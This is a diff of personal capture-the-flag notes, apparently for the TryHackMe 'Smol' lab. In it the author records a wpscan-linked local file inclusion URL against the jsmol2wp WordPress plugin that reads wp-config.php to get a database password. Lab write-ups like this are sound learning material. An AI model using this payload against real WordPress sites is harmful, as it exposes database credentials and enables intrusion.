@@ -372,5 +372,5 @@ define( 'DB_COLLATE', '' );
 ```
 
 > [!note]
-> From wpscan - it led me to this link https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ which led me to a LFI exploit to get a DB password it seems: http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php as shown above but maybe i ente
+> From wpscan - it led me to this link https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ which led me to a LFI exploit to get a DB password it seems: http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php as shown above but maybe i entered the password or its the wrong link i went to which was www.smol.thm/wp-admin - need to know the DB link?
 
